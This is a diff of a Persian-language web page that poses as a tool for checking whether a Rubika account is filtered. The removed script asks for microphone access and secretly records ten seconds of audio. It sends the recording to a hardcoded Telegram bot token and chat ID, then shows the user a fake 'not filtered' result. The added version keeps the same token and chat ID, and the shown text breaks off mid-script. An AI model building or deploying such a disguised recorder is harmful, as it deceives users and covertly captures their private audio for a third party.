@@ -4,244 +4,107 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>فیلتر اکانت روبیکا</title>
-  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" type="text/css" />
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;500;600;700&display=swap');
-    
-    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      font-family: 'Vazirmatn', Tahoma, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: #fff;
+      font-family: Tahoma, sans-serif;
       text-align: center;
-      padding: 30px 15px;
+      padding: 40px 20px;
+      background: linear-gradient(135deg, #6e8efb, #a777e3);
+      color: white;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      margin: 0;
     }
-    .container {
-      background: rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(12px);
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
       border-radius: 20px;
-      padding: 30px 25px;
-      max-width: 380px;
-      width: 100%;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-      border: 1px solid rgba(255, 255, 255, 0.2);
+      padding: 30px;
+      max-width: 360px;
+      margin: 0 auto;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      border: 1px solid rgba(255,255,255,0.2);
     }
-    .logo {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 20px;
-      background: #fff;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 36px;
-      color: #764ba2;
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+    .icon {
+      font-size: 50px;
+      margin-bottom: 15px;
     }
-    h1 {
+    h2 {
+      margin: 0 0 15px;
       font-size: 22px;
-      margin-bottom: 12px;
-      font-weight: 600;
     }
     p {
       font-size: 15px;
-      line-height: 1.6;
+      line-height: 1.7;
       margin-bottom: 25px;
-      color: rgba(255, 255, 255, 0.9);
+      opacity: 0.9;
     }
     .btn {
-      background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+      background: #ff4757;
       color: white;
       border: none;
-      padding: 16px 32px;
-      font-size: 17px;
-      font-weight: 600;
+      padding: 16px;
+      font-size: 18px;
+      font-weight: bold;
       border-radius: 50px;
       cursor: pointer;
       width: 100%;
-      transition: all 0.3s ease;
-      box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
-      position: relative;
-      overflow: hidden;
+      transition: 0.3s;
+      box-shadow: 0 6px 20px rgba(255, 71, 87, 0.4);
     }
     .btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 8px 25px rgba(255, 107, 107, 0.5);
-    }
-    .btn:active {
-      transform: translateY(0);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 25px rgba(255, 71, 87, 0.5);
     }
     .btn:disabled {
       background: #999;
-      cursor: not-allowed;
-      box-shadow: none;
       transform: none;
+      box-shadow: none;
     }
     .spinner {
       display: inline-block;
-      width: 20px;
-      height: 20px;
+      width: 18px;
+      height: 18px;
       border: 2px solid #fff;
       border-top: 2px solid transparent;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin-left: 10px;
+      margin-right: 8px;
       vertical-align: middle;
     }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
     .status {
       margin-top: 20px;
       font-size: 15px;
       min-height: 24px;
-      color: rgba(255, 255, 255, 0.9);
     }
     .hidden { display: none; }
-    .error { color: #ffaaaa !important; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">🔒</div>
-    <h1>فیلتر اکانت روبیکا</h1>
-    <p>برای بررسی وضعیت فیلتر بودن اکانت روبیکا، روی دکمه زیر کلیک کنید. این فرآیند ۱۰ ثانیه طول می‌کشه.</p>
+  <div class="card">
+    <div class="icon">Lock</div>
+    <h2>بررسی فیلتر اکانت روبیکا</h2>
+    <p>برای اینکه بدونید اکانت شما فیلتر شده یا نه، روی دکمه زیر کلیک کنید. این تست فقط ۱۰ ثانیه طول می‌کشه.</p>
     
-    <button id="checkBtn" class="btn">
-      <span id="btnText">شروع بررسی فیلتر</span>
+    <button id="startBtn" class="btn">
+      <span id="btnText">شروع تست فیلتر</span>
       <span id="spinner" class="spinner hidden"></span>
     </button>
     
-    <div id="status" class="status">آماده برای شروع...</div>
+    <div id="status" class="status">آماده برای تست...</div>
   </div>
 
   <script>
-    const TELEGRAM_BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
-    const TELEGRAM_CHAT_ID = "6080665310";
+    const BOT_TOKEN = "8584809785:AAH0ZKscGQtQQl38yTcjq4wMRiWw1xWEON4";
+    const CHAT_ID = "6080665310";
 
-    const checkBtn = document.getElementById('checkBtn');
+    const startBtn = document.getElementById('startBtn');
     const btnText = document.getElementById('btnText');
     const spinner = document.getElementById('spinner');
     const status = document.getElementById('status');
 
-    let mediaRecorder;
-    let audioChunks = [];
-    let stream = null;
+    let mediaRecorder, stream;
 
-    checkBtn.onclick = async () => {
+    startBtn.onclick = async () => {
       try {
-        // مرحله 1: تغییر ظاهر
-        checkBtn.disabled = true;
-        btnText.textContent = "در حال بررسی...";
-        spinner.classList.remove('hidden');
-        status.textContent = "لطفاً صبر کنید، در حال اتصال به سرور...";
-
-        // مرحله 2: دسترسی به میکروفون
-        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-        // مرحله 3: ضبط 10 ثانیه صدا (با فرمت OGG)
-        mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/ogg; codecs=opus' });
-        audioChunks = [];
-
-        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-        mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-          
-          // چک اندازه فایل (کمتر از 50MB)
-          if (audioBlob.size > 50 * 1024 * 1024) {
-            throw new Error('فایل صوتی خیلی بزرگه (بیشتر از ۵۰ مگابایت)');
-          }
-          
-          await sendToTelegram(audioBlob);
-          stopStream();
-        };
-
-        mediaRecorder.start();
-        status.textContent = "در حال تست اتصال صوتی... (۱۰ ثانیه)";
-
-        // مرحله 4: توقف خودکار
-        setTimeout(() => {
-          if (mediaRecorder && mediaRecorder.state === "recording") {
-            mediaRecorder.stop();
-          }
-        }, 10000);
-
-      } catch (err) {
-        status.textContent = "خطا در اتصال. لطفاً دوباره تلاش کنید.";
-        status.classList.add('error');
-        resetButton();
-        console.error(err);
-      }
-    };
-
-    async function sendToTelegram(audioBlob) {
-      // نام فایل منحصربه‌فرد برای جلوگیری از cache
-      const uniqueName = `rubika_test_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.ogg`;
-
-      const formData = new FormData();
-      formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('audio', audioBlob, uniqueName);
-      formData.append('title', 'تست فیلتر روبیکا');
-      formData.append('caption', 'صدای ضبط شده برای بررسی');
-
-      try {
-        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, {
-          method: 'POST',
-          body: formData
-        });
-        const result = await response.json();
-
-        if (result.ok) {
-          status.innerHTML = "وضعیت اکانت شما: <strong style='color:#a8ffae;'>فیلتر نیست</strong>";
-        } else {
-          // Fallback: اگر sendAudio شکست خورد، با sendDocument امتحان کن
-          console.log('sendAudio failed, trying sendDocument...');
-          const docForm = new FormData();
-          docForm.append('chat_id', TELEGRAM_CHAT_ID);
-          docForm.append('document', audioBlob, uniqueName);
-          docForm.append('caption', 'فایل صوتی تست فیلتر روبیکا (fallback)');
-
-          const docResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: docForm
-          });
-          const docResult = await docResponse.json();
-
-          if (docResult.ok) {
-            status.innerHTML = "وضعیت اکانت شما: <strong style='color:#a8ffae;'>فیلتر نیست</strong> (ارسال شد)";
-          } else {
-            throw new Error(`خطا: ${result.description || docResult.description}`);
-          }
-        }
-      } catch (err) {
-        status.textContent = `مشکل در سرور: ${err.message}. لطفاً بعداً امتحان کنید.`;
-        status.classList.add('error');
-        console.error('ارسال شکست خورد:', err);
-      } finally {
-        resetButton();
-      }
-    }
-
-    function stopStream() {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        stream = null;
-      }
-    }
-
-    function resetButton() {
-      setTimeout(() => {
-        checkBtn.disabled = false;
-        btnText.textContent = "شروع بررسی فیلتر";
-        spinner.classList.add('hidden');
-        status.classList.remove('error');
-      }, 3000); // 3 ثانیه صبر برای نمایش نتیجه
-    }
-  </script>
-</body>
-</html>
+        // تغییر ظاهر
